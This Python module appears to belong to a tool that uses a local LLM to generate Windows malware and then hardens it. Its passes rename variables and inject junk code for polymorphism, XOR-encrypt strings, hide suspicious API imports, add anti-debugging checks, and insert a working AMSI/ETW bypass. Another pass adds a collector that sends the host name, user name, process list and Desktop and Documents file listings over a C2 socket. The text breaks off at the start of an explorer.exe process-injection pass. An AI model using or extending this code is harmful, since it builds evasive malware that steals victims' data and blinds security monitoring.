"""Source-level evasion passes — polymorphic mutation, string encryption, API obfuscation, anti-debug, process injection."""

import hashlib
import logging
import os
import random
import re
import string
from typing import Optional

logger = logging.getLogger(__name__)


_KNOWN_MINGW_HEADERS = {
    "windows.h", "winsock2.h", "ws2tcpip.h", "winhttp.h", "wininet.h",
    "wincrypt.h", "bcrypt.h", "ncrypt.h", "ntstatus.h",
    "shlwapi.h", "shlobj.h", "shellapi.h", "combaseapi.h",
    "tlhelp32.h", "psapi.h", "dbghelp.h", "imagehlp.h",
    "iphlpapi.h", "ipexport.h", "iptypes.h", "iprtrmib.h",
    "winternl.h", "winbase.h", "windef.h", "winuser.h", "wingdi.h",
    "winnls.h", "wincon.h", "winerror.h", "winnt.h", "winreg.h",
    "winsvc.h", "mmsystem.h", "nb30.h", "lm.h", "lmcons.h",
    "stdio.h", "stdlib.h", "string.h", "stdint.h", "stdbool.h",
    "stddef.h", "stdarg.h", "math.h", "time.h", "signal.h",
    "errno.h", "assert.h", "ctype.h", "locale.h", "limits.h",
    "float.h", "io.h", "fcntl.h", "sys/stat.h", "sys/types.h",
    "direct.h", "process.h", "malloc.h", "memory.h", "tchar.h",
    "share.h", "aclapi.h", "accctrl.h", "lmaccess.h", "lmapibuf.h",
    "setupapi.h", "devguid.h", "cfgmgr32.h", "newdev.h",
    "objbase.h", "ole2.h", "oleauto.h", "oaidl.h", "ocidl.h",
    "sddl.h", "securitybaseapi.h", "processthreadsapi.h",
    "memoryapi.h", "fileapi.h", "handleapi.h", "synchapi.h",
    "errhandlingapi.h", "profileapi.h", "sysinfoapi.h", "timezoneapi.h",
    "mpr.h", "lmshare.h", "lmwksta.h", "ntsecapi.h",
    "intrin.h", "immintrin.h", "emmintrin.h", "xmmintrin.h",
}

_HEADER_CORRECTIONS = {
    "win.h": "windows.h",
    "window.h": "windows.h",
    "win32.h": "windows.h",
    "winapi.h": "windows.h",
    "iprtrapi.h": "iprtrmib.h",
    "iprtapi.h": "iprtrmib.h",
    "winsocket.h": "winsock2.h",
    "winsocket2.h": "winsock2.h",
    "winsock.h": "winsock2.h",
    "ws2_32.h": "winsock2.h",
    "crypt32.h": "wincrypt.h",
    "advapi.h": "windows.h",
    "advapi32.h": "windows.h",
    "kernel32.h": "windows.h",
    "user32.h": "windows.h",
    "ntdll.h": "winternl.h",
    "unistd.h": None,  # Linux-only, remove for Windows
    "sys/socket.h": None,
    "sys/wait.h": None,
    "netinet/in.h": None,
    "arpa/inet.h": None,
    "pthread.h": None,
}

_WINDOWS_H_MUST_COME_FIRST = {
    "psapi.h", "tlhelp32.h", "dbghelp.h", "imagehlp.h", "shlobj.h",
    "shellapi.h", "winsvc.h", "aclapi.h", "lm.h", "lmcons.h",
    "lmaccess.h", "setupapi.h", "winternl.h", "iphlpapi.h",
    "winhttp.h", "wininet.h", "wincrypt.h", "nb30.h", "mpr.h",
}


def _sanitize_includes(source: str, os_platform: str = "windows") -> str:
    """Fix hallucinated headers, deduplicate, ensure correct ordering."""
    is_windows = os_platform == "windows"
    lines = source.split("\n")
    includes = []
    rest = []
    first_include_pos = -1

    for i, line in enumerate(lines):
        m = re.match(r'#\s*include\s*[<"]([^>"]+)[>"]', line.strip())
        if not m:
            rest.append((i, line))
            continue
        header = m.group(1)
        if is_windows and header in _HEADER_CORRECTIONS:
            replacement = _HEADER_CORRECTIONS[header]
            if replacement is None:
                continue
            header = replacement
        if not is_windows and header in ("windows.h", "winsock2.h", "ws2tcpip.h",
                                          "winhttp.h", "tlhelp32.h", "psapi.h",
                                          "winsvc.h", "wininet.h", "wincrypt.h"):
            continue
        includes.append((i, header))
        if first_include_pos == -1:
            first_include_pos = i

    seen = set()
    deduped = []
    for pos, hdr in includes:
        if hdr not in seen:
            seen.add(hdr)
            deduped.append(hdr)

    if is_windows:
        needs_windows_h = any(h in _WINDOWS_H_MUST_COME_FIRST for h in deduped)
        if needs_windows_h and "windows.h" not in deduped:
            deduped.append("windows.h")
        priority = []
        normal = []
        for h in deduped:
            if h in ("winsock2.h", "ws2tcpip.h"):
                priority.append(h)
            elif h == "windows.h":
                priority.append(h)
            else:
                normal.append(h)
        ordered = []
        if "winsock2.h" in priority:
            ordered.append("winsock2.h")
        if "ws2tcpip.h" in priority:
            ordered.append("ws2tcpip.h")
        if "windows.h" in priority:
            ordered.append("windows.h")
        ordered.extend(normal)
        deduped = ordered

    out = []
    inserted = False
    for pos, line in rest:
        if not inserted and pos >= first_include_pos and first_include_pos >= 0:
            for h in deduped:
                out.append(f"#include <{h}>")
            inserted = True
        out.append(line)
    if not inserted and deduped:
        inc_lines = [f"#include <{h}>" for h in deduped]
        out = inc_lines + out

    return "\n".join(out)


def _mutate_source(source: str, os_platform: str = "windows") -> str:
    """Apply polymorphic source-level mutations to prevent signature convergence.

    Transforms: variable renaming, dead code injection, integer literal mutation,
    and junk attribute injection. Each call produces a unique variant.
    """
    import random
    import string

    _is_linux = "linux" in os_platform.lower()
    rng = random.Random()

    _LOCAL_VAR_RE = re.compile(
        r'^(\s+)(?:int|DWORD|BOOL|HANDLE|char|BYTE|SIZE_T|LONG|HMODULE|HKEY|LSTATUS|LPVOID|UINT|ULONG)'
        r'\s+([a-z_][a-z0-9_]{0,20})\s*(?:=|;)',
        re.MULTILINE,
    )

    var_map: dict[str, str] = {}
    for m in _LOCAL_VAR_RE.finditer(source):
        vname = m.group(2)
        if vname in var_map or len(vname) <= 1:
            continue
        _PROTECTED = {
            'argc', 'argv', 'main', 'i', 'j', 'k', 'n',
            'out_buffer', 'buffer_len', 'payload', 'payload_len',
            'src', 'dst', 'buf', 'len', 'size', 'count', 'result',
            'status', 'ret', 'err', 'rc', 'fd', 'fp', 'ptr',
            'hProcess', 'hThread', 'hModule', 'hKey', 'hFile',
        }
        if vname in _PROTECTED:
            continue
        suffix = ''.join(rng.choices(string.ascii_lowercase, k=4))
        var_map[vname] = f"_{vname[0]}{suffix}"

    for old_name, new_name in var_map.items():
        source = re.sub(r'\b' + re.escape(old_name) + r'\b', new_name, source)

    if _is_linux:
        _JUNK_BLOCKS = [
            "{{ volatile int _jv{0} = 0; _jv{0} = _jv{0} ^ _jv{0}; (void)_jv{0}; }}",
            "{{ volatile int _jx{0} = 1; while(_jx{0} > 1) _jx{0}--; (void)_jx{0}; }}",
            "{{ volatile pid_t _jp{0} = getpid(); (void)_jp{0}; }}",
            "{{ volatile int _jt{0} = (int)time(NULL); (void)_jt{0}; }}",
        ]
    else:
        _JUNK_BLOCKS = [
            "{{ volatile int _jv{0} = 0; _jv{0} = _jv{0} ^ _jv{0}; (void)_jv{0}; }}",
            "{{ volatile DWORD _jd{0} = GetTickCount(); (void)_jd{0}; }}",
            "{{ volatile int _jx{0} = 1; while(_jx{0} > 1) _jx{0}--; (void)_jx{0}; }}",
            "{{ volatile DWORD _jp{0} = GetCurrentProcessId(); (void)_jp{0}; }}",
        ]

    lines = source.split('\n')
    insertions: list[tuple[int, str]] = []
    for idx, line in enumerate(lines):
        stripped = line.strip()
        if (stripped.startswith('if (') or stripped.startswith('for (')
                or stripped.startswith('while (') or stripped == 'return 0;'
                or stripped == 'return FALSE;' or stripped == 'return TRUE;'):
            if rng.random() < 0.15:
                indent = len(line) - len(line.lstrip())
                jid = rng.randint(1000, 9999)
                block = rng.choice(_JUNK_BLOCKS).format(jid)
                insertions.append((idx, ' ' * indent + block))

    for offset, (idx, block) in enumerate(insertions):
        lines.insert(idx + offset, block)

    source = '\n'.join(lines)

    def _mutate_int_line(line: str) -> str:
        if line.lstrip().startswith('#'):
            return line
        if re.search(r'\[\s*\d+\s*\]', line):
            return line

        def _repl(m: re.Match) -> str:
            val = int(m.group(1))
            if val == 0 or val == 1 or abs(val) > 0x7FFFFFFF:
                return m.group(0)
            a = rng.randint(1, min(abs(val), 100))
            if val > 0:
                return f"({val - a} + {a})"
            return f"({val + a} - {a})"

        return re.sub(
            r'(?<!0x)(?<=[\s(,=])(\d{2,8})(?=\s*[);,\]])',
            _repl, line,
        )

    lines = source.split('\n')
    source = '\n'.join(_mutate_int_line(l) for l in lines)

    logger.info("Polymorphic mutation: %d vars renamed, %d junk blocks inserted",
                len(var_map), len(insertions))
    return source


def _encrypt_string_literals(source: str) -> str:
    """Replace plaintext string literals with XOR-encrypted byte arrays + runtime decryption.

    Generates a per-build random XOR key, encrypts every qualifying string literal,
    and replaces it with (char*)_esN. A _xd_init() function decrypts all strings
    in-place on first call; it's injected at the start of _worker_thread or main.

    Skips: format strings with %specifiers, strings <= 3 chars, preprocessor lines,
    strings in sizeof/typeof, and common separators.
    """
    import os as _os

    xor_key = _os.urandom(16)
    key_len = len(xor_key)

    _SKIP_LINE_RE = re.compile(r'^\s*#\s*(include|define|pragma|if|ifdef|ifndef|endif|else|elif|error)\b')
    _ARRAY_INIT_RE = re.compile(r'\w+\s*\[[^\]]*\](?:\s*\[[^\]]*\])?\s*=\s*["{]')
    _FMT_RE = re.compile(r'%[-+0 #]*\d*\.?\d*[diouxXeEfFgGaAcspn%lhzjt]')
    _STR_RE = re.compile(r'"([^"\\]*(?:\\.[^"\\]*)*)"')
    _TRIVIAL = frozenset(('\\n', '\\r\\n', '\\t', '\\0', ' ', ', ', ': ', ' - ', '\\\\', '\\r', ''))

    encrypted_strings: list[tuple[str, str, int]] = []
    enc_id = 0

    def _should_encrypt(raw: str) -> bool:
        if raw in _TRIVIAL:
            return False
        try:
            decoded = raw.encode('utf-8').decode('unicode_escape')
        except (UnicodeDecodeError, ValueError):
            decoded = raw
        if len(decoded) <= 3:
            return False
        if _FMT_RE.search(raw):
            return False
        return True

    lines = source.split('\n')
    new_lines = []
    _in_array_init = 0
    for line_idx, line in enumerate(lines):
        if _SKIP_LINE_RE.match(line):
            new_lines.append(line)
            continue
        if _ARRAY_INIT_RE.search(line):
            _in_array_init += line.count('{') - line.count('}')
            new_lines.append(line)
            continue
        if _in_array_init > 0:
            _in_array_init += line.count('{') - line.count('}')
            if _in_array_init < 0:
                _in_array_init = 0
            new_lines.append(line)
            continue

        # Detect implicit string concatenation across lines:
        # skip encryption if this line's string continues on the next line
        # or this line IS a continuation of the previous line's string.
        _is_concat_line = False
        stripped = line.rstrip()
        if stripped.endswith('"') and line_idx + 1 < len(lines):
            next_stripped = lines[line_idx + 1].lstrip()
            if next_stripped.startswith('"'):
                _is_concat_line = True
        if line.lstrip().startswith('"') and line_idx > 0:
            prev_stripped = lines[line_idx - 1].rstrip()
            if prev_stripped.endswith('"'):
                _is_concat_line = True

        if _is_concat_line:
            new_lines.append(line)
            continue

        def _replace_str(m):
            nonlocal enc_id
            raw = m.group(1)
            if not _should_encrypt(raw):
                return m.group(0)
            try:
                decoded = raw.encode('utf-8').decode('unicode_escape')
            except (UnicodeDecodeError, ValueError):
                decoded = raw
            plainbytes = decoded.encode('utf-8')
            encrypted = bytes(b ^ xor_key[i % key_len] for i, b in enumerate(plainbytes))
            var_name = f"_es{enc_id}"
            enc_id += 1
            enc_hex = ", ".join(f"0x{b:02x}" for b in encrypted)
            encrypted_strings.append((var_name, enc_hex, len(plainbytes)))
            return f"((char*){var_name})"

        new_line = _STR_RE.sub(_replace_str, line)
        new_lines.append(new_line)

    if not encrypted_strings:
        return source

    key_hex = ", ".join(f"0x{b:02x}" for b in xor_key)
    decryptor_lines = [
        "",
        f"static const unsigned char _xk[{key_len}] = {{{key_hex}}};",
    ]
    for var_name, enc_hex, length in encrypted_strings:
        decryptor_lines.append(f"static unsigned char {var_name}[{length + 1}] = {{{enc_hex}, 0}};")

    init_body_parts = []
    for var_name, _, length in encrypted_strings:
        init_body_parts.append(
            f"for(int i=0;i<{length};i++){var_name}[i]^=_xk[i%{key_len}];"
        )
    decryptor_lines.append(
        f"static void _xd_init(void){{static int _d=0;if(_d)return;_d=1;"
        + "".join(init_body_parts)
        + "}"
    )
    decryptor_lines.append("")

    rebuilt = "\n".join(new_lines)

    last_include = 0
    for m in re.finditer(r'^#include\s*<[^>]+>\s*$', rebuilt, re.MULTILINE):
        last_include = m.end()
    if last_include:
        rebuilt = rebuilt[:last_include] + "\n" + "\n".join(decryptor_lines) + rebuilt[last_include:]
    else:
        rebuilt = "\n".join(decryptor_lines) + "\n" + rebuilt

    entry_fn = '_worker_thread' if '_worker_thread' in rebuilt else 'main'
    entry_re = re.compile(
        r'((?:DWORD\s+WINAPI\s+_worker_thread|int\s+main)\s*\([^)]*\)\s*\{)',
        re.MULTILINE,
    )
    rebuilt = entry_re.sub(r'\1\n    _xd_init();', rebuilt, count=1)

    logger.info("String encryption: %d literals encrypted with %d-byte XOR key", len(encrypted_strings), key_len)
    return rebuilt


_SUSPICIOUS_APIS: dict[str, tuple[str, str, str]] = {
    "CreateToolhelp32Snapshot": ("kernel32.dll", "HANDLE", "DWORD,DWORD"),
    "Process32First":          ("kernel32.dll", "BOOL",   "HANDLE,LPPROCESSENTRY32"),
    "Process32Next":           ("kernel32.dll", "BOOL",   "HANDLE,LPPROCESSENTRY32"),
    "Module32First":           ("kernel32.dll", "BOOL",   "HANDLE,LPMODULEENTRY32"),
    "Module32Next":            ("kernel32.dll", "BOOL",   "HANDLE,LPMODULEENTRY32"),
    "OpenProcess":             ("kernel32.dll", "HANDLE", "DWORD,BOOL,DWORD"),
    "VirtualAllocEx":          ("kernel32.dll", "LPVOID", "HANDLE,LPVOID,SIZE_T,DWORD,DWORD"),
    "WriteProcessMemory":      ("kernel32.dll", "BOOL",   "HANDLE,LPVOID,LPCVOID,SIZE_T,SIZE_T*"),
    "CreateRemoteThread":      ("kernel32.dll", "HANDLE", "HANDLE,LPSECURITY_ATTRIBUTES,SIZE_T,LPTHREAD_START_ROUTINE,LPVOID,DWORD,LPDWORD"),
    "RegOpenKeyExA":           ("advapi32.dll", "LSTATUS","HKEY,LPCSTR,DWORD,REGSAM,PHKEY"),
    "RegSetValueExA":          ("advapi32.dll", "LSTATUS","HKEY,LPCSTR,DWORD,DWORD,const BYTE*,DWORD"),
    "RegCreateKeyExA":         ("advapi32.dll", "LSTATUS","HKEY,LPCSTR,DWORD,LPSTR,DWORD,REGSAM,LPSECURITY_ATTRIBUTES,PHKEY,LPDWORD"),
    "CryptAcquireContextA":    ("advapi32.dll", "BOOL",   "HCRYPTPROV*,LPCSTR,LPCSTR,DWORD,DWORD"),
    "CryptGenRandom":          ("advapi32.dll", "BOOL",   "HCRYPTPROV,DWORD,BYTE*"),
    "CryptEncrypt":            ("advapi32.dll", "BOOL",   "HCRYPTKEY,HCRYPTHASH,BOOL,DWORD,BYTE*,DWORD*,DWORD"),
    "CryptCreateHash":         ("advapi32.dll", "BOOL",   "HCRYPTPROV,ALG_ID,HCRYPTKEY,DWORD,HCRYPTHASH*"),
    "CryptDeriveKey":          ("advapi32.dll", "BOOL",   "HCRYPTPROV,ALG_ID,HCRYPTHASH,DWORD,HCRYPTKEY*"),
    "GetExtendedTcpTable":     ("iphlpapi.dll", "DWORD",  "PVOID,PDWORD,BOOL,ULONG,int,ULONG"),
    "WNetOpenEnumA":           ("mpr.dll",      "DWORD",  "DWORD,DWORD,DWORD,LPNETRESOURCEA,LPHANDLE"),
    "WNetEnumResourceA":       ("mpr.dll",      "DWORD",  "HANDLE,LPDWORD,LPVOID,LPDWORD"),
    "InternetOpenA":           ("wininet.dll",  "HINTERNET","LPCSTR,DWORD,LPCSTR,LPCSTR,DWORD"),
    "InternetOpenUrlA":        ("wininet.dll",  "HINTERNET","HINTERNET,LPCSTR,LPCSTR,DWORD,DWORD,DWORD_PTR"),
    "IsDebuggerPresent":       ("kernel32.dll", "BOOL",     "void"),
    "CheckRemoteDebuggerPresent": ("kernel32.dll", "BOOL",  "HANDLE,PBOOL"),
}


def _obfuscate_api_calls(source: str) -> str:
    """Replace suspicious static API imports with dynamic GetProcAddress resolution.

    For each suspicious API call found in the source, generates a typedef +
    function pointer resolved via GetProcAddress at runtime. This hides the
    API names from the import address table (IAT) in the compiled binary.
    """
    used_apis: dict[str, tuple[str, str, str]] = {}
    for api_name, (dll, ret, params) in _SUSPICIOUS_APIS.items():
        if re.search(r'\b' + api_name + r'\s*\(', source):
            used_apis[api_name] = (dll, ret, params)

    if not used_apis:
        return source

    dlls_needed: dict[str, list[str]] = {}
    for api_name, (dll, _, _) in used_apis.items():
        dlls_needed.setdefault(dll, []).append(api_name)

    resolver_lines = [
        "",
        "/* dynamic API resolution */",
    ]
    for api_name, (dll, ret, params) in used_apis.items():
        ptr_name = f"_p{api_name}"
        type_name = f"_t{api_name}"
        resolver_lines.append(f"typedef {ret} (WINAPI *{type_name})({params});")
        resolver_lines.append(f"static {type_name} {ptr_name} = NULL;")

    init_parts = []
    dll_vars: dict[str, str] = {}
    for dll in dlls_needed:
        safe = dll.replace('.', '_').replace('-', '_')
        var = f"_h{safe}"
        dll_vars[dll] = var
        init_parts.append(f'HMODULE {var}=LoadLibraryA("{dll}");')

    for api_name, (dll, _, _) in used_apis.items():
        ptr_name = f"_p{api_name}"
        type_name = f"_t{api_name}"
        hmod = dll_vars[dll]
        init_parts.append(f'if({hmod}){ptr_name}=({type_name})GetProcAddress({hmod},"{api_name}");')

    resolver_lines.append(
        "static void _api_init(void){static int _d=0;if(_d)return;_d=1;"
        + "".join(init_parts) + "}"
    )
    resolver_lines.append("")

    for api_name in used_apis:
        ptr_name = f"_p{api_name}"
        source = re.sub(r'\b' + api_name + r'\s*\(', ptr_name + '(', source)

    _extra_headers = set()
    resolver_text = "\n".join(resolver_lines)
    if re.search(r'LPPROCESSENTRY32|LPMODULEENTRY32|PROCESSENTRY32|MODULEENTRY32', resolver_text):
        _extra_headers.add("tlhelp32.h")
    if re.search(r'LPSECURITY_ATTRIBUTES', resolver_text) and 'winbase.h' not in source:
        pass
    if re.search(r'ALG_ID|HCRYPTPROV|HCRYPTKEY|HCRYPTHASH', resolver_text):
        _extra_headers.add("wincrypt.h")
    if re.search(r'MIB_', resolver_text):
        _extra_headers.add("iphlpapi.h")

    for hdr in _extra_headers:
        if hdr not in source:
            win_match = re.search(r'^#include\s*<windows\.h>\s*$', source, re.MULTILINE)
            if win_match:
                source = source[:win_match.end()] + f'\n#include <{hdr}>' + source[win_match.end():]
            else:
                inc_match = re.search(r'^#include\s*<[^>]+>\s*$', source, re.MULTILINE)
                if inc_match:
                    source = source[:inc_match.start()] + f'#include <{hdr}>\n' + source[inc_match.start():]

    last_include = 0
    for m in re.finditer(r'^#include\s*<[^>]+>\s*$', source, re.MULTILINE):
        last_include = m.end()
    if last_include:
        source = source[:last_include] + "\n" + "\n".join(resolver_lines) + source[last_include:]
    else:
        source = "\n".join(resolver_lines) + "\n" + source

    entry_fn = '_worker_thread' if '_worker_thread' in source else 'main'
    entry_re = re.compile(
        r'((?:DWORD\s+WINAPI\s+_worker_thread|int\s+main)\s*\([^)]*\)\s*\{)',
        re.MULTILINE,
    )
    source = entry_re.sub(r'\1\n    _api_init();', source, count=1)

    logger.info("IAT obfuscation: %d suspicious APIs dynamically resolved", len(used_apis))
    return source


_AMSI_ETW_BYPASS_CODE = r"""
/* AMSI + ETW bypass — patch in-memory to blind AV scanning and telemetry */
typedef BOOL (WINAPI *_tVP)(LPVOID,SIZE_T,DWORD,PDWORD);
static void _patch_amsi_etw(void) {
    DWORD _old;
    _tVP _vp = (_tVP)GetProcAddress(GetModuleHandleA("kernel32.dll"), "VirtualProtect");
    if (!_vp) return;
    HMODULE _ham = LoadLibraryA("amsi.dll");
    if (_ham) {
        void *_asb = (void*)GetProcAddress(_ham, "AmsiScanBuffer");
        if (_asb) {
            _vp(_asb, 6, PAGE_EXECUTE_READWRITE, &_old);
            unsigned char _ap[] = {0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3};
            memcpy(_asb, _ap, 6);
            _vp(_asb, 6, _old, &_old);
        }
    }
    HMODULE _hnt = GetModuleHandleA("ntdll.dll");
    if (_hnt) {
        void *_eew = (void*)GetProcAddress(_hnt, "EtwEventWrite");
        if (_eew) {
            _vp(_eew, 1, PAGE_EXECUTE_READWRITE, &_old);
            *(unsigned char*)_eew = 0xC3;
            _vp(_eew, 1, _old, &_old);
        }
    }
}
"""


def _inject_amsi_etw_bypass(source: str) -> str:
    """Inject AMSI and ETW bypass code into the generated source.

    Patches AmsiScanBuffer to return E_INVALIDARG (skipping scan) and
    EtwEventWrite to return immediately (disabling telemetry). Called
    before any payload logic runs.
    """
    if '_patch_amsi_etw' in source:
        return source

    if '#include <string.h>' not in source:
        source = source.replace('#include <windows.h>', '#include <windows.h>\n#include <string.h>')

    last_include = 0
    for m in re.finditer(r'^#include\s*<[^>]+>\s*$', source, re.MULTILINE):
        last_include = m.end()

    if last_include:
        source = source[:last_include] + _AMSI_ETW_BYPASS_CODE + source[last_include:]
    else:
        source = _AMSI_ETW_BYPASS_CODE + source

    entry_re = re.compile(
        r'((?:DWORD\s+WINAPI\s+_worker_thread|int\s+main)\s*\([^)]*\)\s*\{)',
        re.MULTILINE,
    )
    source = entry_re.sub(r'\1\n    _patch_amsi_etw();', source, count=1)

    logger.info("AMSI/ETW bypass injected")
    return source


_ANTI_DEBUG_CODE = r"""
/* anti-debugging — exit silently if analyst tools are detected */
static int _chk_dbg(void) {
    if (IsDebuggerPresent()) return 1;
    BOOL _rd = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &_rd);
    if (_rd) return 1;
    /* timing check: rdtsc delta > 10M cycles = single-stepping */
    LARGE_INTEGER _f, _s, _e;
    if (QueryPerformanceFrequency(&_f) && QueryPerformanceCounter(&_s)) {
        volatile int _v = 0;
        for (int i = 0; i < 100; i++) _v += i;
        QueryPerformanceCounter(&_e);
        if ((_e.QuadPart - _s.QuadPart) > _f.QuadPart / 10) return 1;
    }
    return 0;
}
"""


def _inject_anti_debug(source: str) -> str:
    """Inject anti-debugging checks that exit silently if a debugger is detected."""
    if '_chk_dbg' in source:
        return source

    last_include = 0
    for m in re.finditer(r'^#include\s*<[^>]+>\s*$', source, re.MULTILINE):
        last_include = m.end()

    if last_include:
        source = source[:last_include] + _ANTI_DEBUG_CODE + source[last_include:]
    else:
        source = _ANTI_DEBUG_CODE + source

    entry_re = re.compile(
        r'((?:DWORD\s+WINAPI\s+_worker_thread|int\s+main)\s*\([^)]*\)\s*\{)',
        re.MULTILINE,
    )
    source = entry_re.sub(r'\1\n    if (_chk_dbg()) return 0;', source, count=1)

    logger.info("Anti-debugging checks injected")
    return source


def _ensure_exfil_substance(source: str) -> str:
    """Ensure exfiltration functions actually collect and send data.

    The local LLM often generates stubs that connect to C2 but never
    send() anything meaningful. This injects a deterministic sysinfo
    collection block if the code has a socket but no substantial send.
    """
    from .generation_engine import _extract_c_functions
    if 'send(' not in source and 'WSASend(' not in source:
        return source  # no networking at all — nothing to fix
    # Check if there's already a substantial send (>= 64 bytes of real data)
    # Look for send() calls that reference a populated buffer
    has_getcomputername = bool(re.search(r'GetComputerName[AW]\s*\(', source))
    has_getusername = bool(re.search(r'GetUserName[AW]\s*\(', source))
    has_readfile = bool(re.search(r'ReadFile\s*\(', source))
    has_findfirst = bool(re.search(r'FindFirstFile[AW]\s*\(', source))
    has_snapshot = bool(re.search(r'CreateToolhelp32Snapshot\s*\(', source))
    has_substantial_send = bool(re.search(
        r'send\s*\(\s*\w+\s*,\s*(?:\(\s*(?:const\s+)?char\s*\*\s*\))?\s*\w+\s*,\s*(?:[1-9]\d{2,}|strlen|sizeof|_len|buf_len|data_len|total)',
        source,
    ))

    substance_score = sum([has_getcomputername, has_getusername, has_readfile,
                           has_findfirst, has_snapshot, has_substantial_send])
    if substance_score >= 3:
        logger.info("Behavioral substance check: score %d/6 — sufficient", substance_score)
        return source

    logger.warning("Behavioral substance check: score %d/6 — injecting sysinfo collector", substance_score)

    # Find the function that calls send() — that's our exfil function
    funcs = _extract_c_functions(source)
    exfil_func = None
    for name, (start, end) in funcs.items():
        body = source[start:end]
        if 'send(' in body or 'WSASend(' in body:
            exfil_func = name
            break

    if not exfil_func:
        return source

    # Inject a sysinfo collector helper before the exfil function
    collector = '''
static int _collect_sysinfo(char *buf, int max_len) {
    int off = 0;
    char tmp[256];
    DWORD sz;

    memcpy(buf + off, "[SYSINFO]\\n", 10); off += 10;
    sz = sizeof(tmp);
    if (GetComputerNameA(tmp, &sz)) {
        off += snprintf(buf + off, max_len - off, "HOST=%s\\n", tmp);
    }
    sz = sizeof(tmp);
    if (GetUserNameA(tmp, &sz)) {
        off += snprintf(buf + off, max_len - off, "USER=%s\\n", tmp);
    }
    OSVERSIONINFOA ovi;
    ovi.dwOSVersionInfoSize = sizeof(ovi);
    off += snprintf(buf + off, max_len - off, "PID=%lu\\n", GetCurrentProcessId());

    memcpy(buf + off, "\\n[PROCS]\\n", 9); off += 9;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe;
        pe.dwSize = sizeof(pe);
        if (Process32First(hSnap, &pe)) {
            int cnt = 0;
            do {
                if (cnt++ > 30) break;
                off += snprintf(buf + off, max_len - off, "%lu %s\\n",
                                pe.th32ProcessID, pe.szExeFile);
            } while (off < max_len - 128 && Process32Next(hSnap, &pe));
        }
        CloseHandle(hSnap);
    }

    memcpy(buf + off, "\\n[FILES]\\n", 9); off += 9;
    WIN32_FIND_DATAA fd;
    const char *dirs[] = {
        "C:\\\\Users\\\\*\\\\Desktop\\\\*",
        "C:\\\\Users\\\\*\\\\Documents\\\\*",
        NULL
    };
    for (int di = 0; dirs[di]; di++) {
        HANDLE hF = FindFirstFileA(dirs[di], &fd);
        if (hF != INVALID_HANDLE_VALUE) {
            int fc = 0;
            do {
                if (fc++ > 15) break;
                if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                    off += snprintf(buf + off, max_len - off, "%s %lu\\n",
                                    fd.cFileName, fd.nFileSizeLow);
                }
            } while (off < max_len - 128 && FindNextFileA(hF, &fd));
            FindClose(hF);
        }
    }

    return off;
}
'''

    # Find the position of the exfil function and insert collector before it
    start, _end = funcs[exfil_func]
    source = source[:start] + collector + '\n' + source[start:]

    # Now inject a call to _collect_sysinfo inside the exfil function
    # Find the first send() call and prepend the collector call + update the send size
    funcs2 = _extract_c_functions(source)
    if exfil_func not in funcs2:
        return source
    s2, e2 = funcs2[exfil_func]
    body = source[s2:e2]

    # If the function has send() with a trivial size, replace it
    send_m = re.search(
        r'send\s*\(\s*(\w+)\s*,\s*(?:\(\s*(?:const\s+)?char\s*\*\s*\))?\s*(\w+)\s*,\s*(\w+|\d+)',
        body,
    )
    if send_m:
        sock_var = send_m.group(1)
        # Inject buffer + collector call before the send
        inject_block = (
            f'    char _exfil_buf[8192];\n'
            f'    int _exfil_len = _collect_sysinfo(_exfil_buf, sizeof(_exfil_buf));\n'
            f'    send({sock_var}, _exfil_buf, _exfil_len, 0);\n'
        )
        # Insert just before the first send() call in the body
        send_pos = body.find('send(')
        if send_pos > 0:
            # Find start of the line containing send
            line_start = body.rfind('\n', 0, send_pos)
            if line_start == -1:
                line_start = 0
            else:
                line_start += 1
            abs_pos = s2 + line_start
            source = source[:abs_pos] + inject_block + source[abs_pos:]
            logger.info("Injected _collect_sysinfo call into %s() before send()", exfil_func)

    # Ensure tlhelp32.h is included after windows.h (needs Windows types)
    if 'tlhelp32.h' not in source:
        win_match = re.search(r'^#include\s*<windows\.h>\s*$', source, re.MULTILINE)
        if win_match:
            source = source[:win_match.end()] + '\n#include <tlhelp32.h>' + source[win_match.end():]
        else:
            inc_pos = source.find('#include')
            if inc_pos >= 0:
                source = source[:inc_pos] + '#include <tlhelp32.h>\n' + source[inc_pos:]

    return source


def _inject_seh_in_main(source: str) -> str:
    """Move main() logic into a worker thread so crashes don't kill the process."""
    if re.search(r'\b_worker_thread\b', source):
        logger.info("SEH injection: _worker_thread already exists, skipping")
        return source
    main_match = re.search(r'((?:int|BOOL|void|DWORD)\s+main\s*\([^)]*\)\s*\{)', source)
    if not main_match:
        return source

    main_start = main_match.end()
    brace_depth = 1
    pos = main_start
    while pos < len(source) and brace_depth > 0:
        if source[pos] == '{':
            brace_depth += 1
        elif source[pos] == '}':
            brace_depth -= 1
        pos += 1
    main_end = pos - 1

    main_body = source[main_start:main_end]

    crash_filter = (
        "\nLONG WINAPI _crash_filter(EXCEPTION_POINTERS *ep) {\n"
        "    (void)ep;\n"
        "    ExitThread(1);\n"
        "    return EXCEPTION_EXECUTE_HANDLER;\n"
        "}\n"
    )

    worker_fn = (
        "\nDWORD WINAPI _worker_thread(LPVOID _unused) {\n"
        "    (void)_unused;\n"
        + main_body
        + "\n    return 0;\n}\n\n"
    )

    new_main_body = (
        "\n"
        "    SetUnhandledExceptionFilter(_crash_filter);\n"
        "    SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX | SEM_NOOPENFILEERRORBOX);\n"
        "    HANDLE hThread = CreateThread(NULL, 0, _worker_thread, NULL, 0, NULL);\n"
        "    if (hThread) {\n"
        "        WaitForSingleObject(hThread, 30000);\n"
        "        CloseHandle(hThread);\n"
        "    } else {\n"
        "        _worker_thread(NULL);\n"
        "    }\n"
        "    Sleep(5000);\n"
        "    return 0;\n"
    )

    pre_main = source[:main_match.start()]
    pre_main = re.sub(r'^[ \t]*(?:int|BOOL|void|DWORD)\s+main\s*\([^)]*\)\s*;\s*$', '', pre_main, flags=re.MULTILINE)

    result = pre_main + crash_filter + worker_fn + "int main(int argc, char *argv[]) {" + new_main_body + source[main_end:]
    logger.info("SEH injection: moved main() body to _worker_thread + Sleep(5000)")
    return result


def _inject_process_injection(source: str) -> str:
    """Inject process injection stub — injects a small shellcode stub into explorer.exe.

    Wraps the malware's execution with a process injection technique:
    1. Enumerates processes to find explorer.exe
